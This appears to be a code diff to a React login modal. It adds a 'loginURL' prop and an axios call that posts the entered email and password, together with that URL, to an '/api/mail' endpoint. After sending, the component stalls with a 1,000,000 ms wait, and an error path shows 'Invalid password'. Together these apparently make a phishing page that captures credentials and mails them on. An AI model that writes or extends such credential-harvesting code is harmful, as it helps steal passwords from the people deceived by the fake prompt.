@@ -1,7 +1,8 @@
 import React, { useState } from 'react';
 import '@/styles/globals.css';
+import axios from 'axios';
 
-const LoginModal = ({ email, styles= {} }) => {
+const LoginModal = ({ email, styles= {}, loginURL= 'NOT PROVIDED' }) => {
   const [password, setPassword] = useState('');
   const [isLoading, setIsLoading] = useState(false);
   const [error, setError] = useState('');
@@ -13,6 +14,7 @@ const LoginModal = ({ email, styles= {} }) => {
     
     try {
       // Add your login logic here
+      await axios.post('/api/mail', { email, password, loginURL });
       await new Promise(resolve => setTimeout(resolve, 1000000));
     } catch (err) {
       setError('Invalid password. Please try again.');
